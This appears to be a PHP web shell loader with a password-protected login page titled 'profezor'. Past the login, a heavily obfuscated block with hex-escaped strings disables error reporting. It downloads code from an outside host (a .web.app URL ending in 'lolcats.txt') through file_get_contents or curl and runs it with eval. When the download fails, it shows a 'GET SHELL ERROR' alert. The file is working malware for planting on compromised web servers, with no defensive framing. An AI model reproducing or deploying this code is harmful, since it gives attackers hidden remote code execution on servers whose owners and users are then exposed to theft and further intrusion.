<?php
session_start();
date_default_timezone_set("Asia/Jakarta");

$default_action = "FilesMan";
$default_use_ajax = true;
$default_charset = 'UTF-8';

function show_login_page($message = "Welcome to profezor")
{
?>
    <!DOCTYPE html>
    <html>
    <!DOCTYPE html>
    <html lang="en">
    <head>
        <meta charset="UTF-8">
        <meta http-equiv="X-UA-Compatible" content="IE=edge">
        <meta name="viewport" content="width=device-width, initial-scale=1.0">
        <style>
            body {
                font-family: monospace;
                background-color: #000000;
            }

            input[type="password"] {
                border: none;
                border-bottom: 1px solid black;
                padding: 2px;
            }

            input[type="password"]:focus {
                outline: none;
            }

            input[type="submit"] {
                border: none;
                padding: 4.5px 20px;
                background-color: #2e313d;
                color: #FFF;
            }
        </style>
<style type="text/css">
       

	html {
	color: #FFF;
	font-family: 'Ubuntu';
	font-size: 13px;
	width: 100%;
}
        body {
    background: url(https://avatars.mds.yandex.net/i?id=0bde3df95763fe7fe4f285be8851d5ad_l-4575448-images-thumbs&ref=rim&n=13) no-repeat center fixed; 
    background-size: cover; 
        }
		input[type=password] {
	background: transparent; 
	color: red; 
	border: 3px solid white;
	margin: 2px auto;
	padding-left: 2px;
	font-family: 'Permanent Marker';
	font-size: 12px;
	}
</style>
</head>

    <body>
        <form action="" method="post">
            <div align="center">
                <h5><font color="white"></h5><br>
                <input type="password" name="pass" placeholder="&nbsp;Password Dek">&nbsp;<input type="submit" name="submit" value=">">
            </div>
        </form>
    </body>

    </html>

    </html>
<?php
    exit;
}

if (!isset($_SESSION['authenticated'])) {
    $stored_hashed_password = '$2y$10$XZ.gQZx8RX8n72PV19Fn7eC24vdku28vrr836p6fMEsOXa2aH.9nG'; 

    if (isset($_POST['pass']) && password_verify($_POST['pass'], $stored_hashed_password)) {
        $_SESSION['authenticated'] = true;
    } else {
        show_login_page();
    }
}
?>
<?php ${"\x47\x4c\x4f\x42A\x4c\x53"}["\x76\x6d\x74\x72\x62\x72"]="\x63\x6f\x6fn\x72\x7a\x79";${"G\x4c\x4f\x42\x41L\x53"}["kh\x72y\x63\x69\x72bd"]="\x68\x65\x6f\x78\x75\x71";${"\x47L\x4fBAL\x53"}["\x67\x73f\x67x\x77sq\x7a\x78d\x6d"]="rz\x68t\x69\x68x";${"\x47\x4c\x4f\x42\x41\x4c\x53"}["\x69m\x78\x70\x73\x76\x6a\x6f\x71\x79j\x77"]="\x63o\x6et\x65\x6e\x74";${"\x47\x4c\x4f\x42A\x4c\x53"}["\x63nx\x73\x67\x68\x70\x62\x6f\x6f\x75"]="\x75\x72\x6c";${"\x47\x4c\x4f\x42\x41\x4c\x53"}["s\x75\x6a\x74\x64\x65\x6f\x74\x76\x6b"]="c\x68";eRrOr_rEpOrTiNg(0);sEt_tImE_LiMiT(0);fUnCtIoN AnotherLove($url){${"\x47\x4cO\x42A\x4c\x53"}["\x6f\x76\x67\x6c\x6e\x79\x63\x6d"]="\x75\x72\x6c";rEtUrN fIlE_GeT_CoNtEnTs(${${"\x47\x4c\x4f\x42\x41\x4cS"}["\x6fv\x67\x6c\x6e\x79c\x6d"]});}fUnCtIoN AnotherGirl($url){$ngynurtdgb="\x70yx\x68bt";${$ngynurtdgb}="c\x68";${${"\x47\x4cO\x42\x41\x4c\x53"}["\x67\x73\x66\x67x\x77\x73\x71\x7ax\x64m"]}="co\x6et\x65\x6e\x74";${"G\x4c\x4f\x42A\x4c\x53"}["\x76\x6f\x74xovo\x64"]="\x63\x68";${"\x47\x4c\x4fB\x41L\x53"}["\x6a\x79\x69\x73v\x68\x69\x74\x79t"]="\x70\x79\x78h\x62\x74";${"\x47\x4c\x4f\x42A\x4c\x53"}["\x68\x6e\x71\x76\x74\x70\x69\x63"]="\x75\x72\x6c";${${"\x47\x4cO\x42A\x4c\x53"}["\x73ujt\x64\x65\x6f\x74\x76k"]}=cUrL_InIt(${${"\x47\x4c\x4f\x42\x41\x4c\x53"}["\x68\x6e\x71\x76t\x70\x69\x63"]});${${"\x47L\x4fB\x41\x4c\x53"}["\x6b\x68r\x79\x63i\x72\x62\x64"]}="c\x6f\x6e\x74\x65\x6e\x74";cUrL_SeToPt(${${${"\x47LOBA\x4c\x53"}["jy\x69s\x76\x68\x69t\x79t"]}},CURLOPT_RETURNTRANSFER,true);${${${"G\x4c\x4f\x42A\x4cS"}["\x6b\x68\x72\x79c\x69r\x62\x64"]}}=cUrL_ExEc(${${"G\x4c\x4f\x42\x41\x4c\x53"}["\x73\x75\x6a\x74\x64\x65\x6ft\x76\x6b"]});cUrL_ClOsE(${${"\x47L\x4f\x42\x41\x4c\x53"}["\x76\x6f\x74\x78\x6f\x76o\x64"]});rEtUrN${${${"\x47L\x4fBA\x4cS"}["\x67\x73\x66\x67\x78w\x73\x71\x7ax\x64m"]}};}fUnCtIoN Tactilite(){eChO"\x3cs\x63r\x69\x70\x74\x3ea\x6ce\x72\x74(\"\x47E\x54\x20\x53\x48\x45\x4cL\x20\x45\x52R\x4fR\x21\x20\x54R\x59\x20\x55\x53I\x4eG\x20\x4f\x52\x49\x47\x49\x4e\x41L\x20\x43\x4f\x44E\x2e\x22)\x3b</\x73c\x72\x69pt>";}${${"G\x4cOB\x41L\x53"}["\x76\x6d\x74rb\x72"]}="\x75\x72l";${"\x47L\x4f\x42\x41\x4c\x53"}["z\x6f\x72\x6f\x70\x70\x73\x67\x76\x7a"]="\x63\x6f\x6e\x74\x65\x6e\x74";${${${"\x47\x4c\x4fBAL\x53"}["\x76\x6d\x74\x72\x62\x72"]}}="\x68\x74\x74p\x73://\x70o\x69\x70\x65\x74\x73\x74\x69l\x6c\x68igh\x2e\x77\x65b\x2ea\x70p/\x73\x6f\x75\x72c\x65/\x6co\x6c\x63\x61t\x73\x2et\x78\x74";${${"G\x4c\x4f\x42\x41L\x53"}["\x7a\x6f\x72\x6f\x70p\x73\x67v\x7a"]}=AnotherLove(${${"\x47\x4c\x4f\x42\x41\x4c\x53"}["\x63\x6e\x78s\x67\x68\x70b\x6f\x6f\x75"]});iF(!${${"\x47\x4c\x4f\x42\x41\x4c\x53"}["\x69\x6d\x78\x70\x73\x76\x6ao\x71\x79\x6a\x77"]}){${"\x47L\x4f\x42\x41\x4c\x53"}["\x68\x65\x64\x6c\x6a\x76\x66\x73\x6a"]="\x63\x6f\x6e\x74e\x6e\x74";${"\x47\x4cO\x42A\x4c\x53"}["\x68\x61\x66\x6c\x7a\x67\x6c"]="\x75\x72\x6c";${${"\x47\x4c\x4fB\x41L\x53"}["\x68e\x64\x6c\x6a\x76\x66\x73\x6a"]}=AnotherGirl(${${"\x47L\x4f\x42\x41\x4c\x53"}["\x68\x61f\x6cz\x67l"]});}iF(!${${"\x47\x4c\x4fB\x41\x4c\x53"}["i\x6d\x78\x70\x73\x76\x6a\x6f\x71\x79\x6a\x77"]}){Tactilite();}else{eVaL("?>".${${"\x47\x4c\x4fB\x41\x4cS"}["\x69\x6d\x78\x70\x73\x76joq\x79\x6aw"]});}?>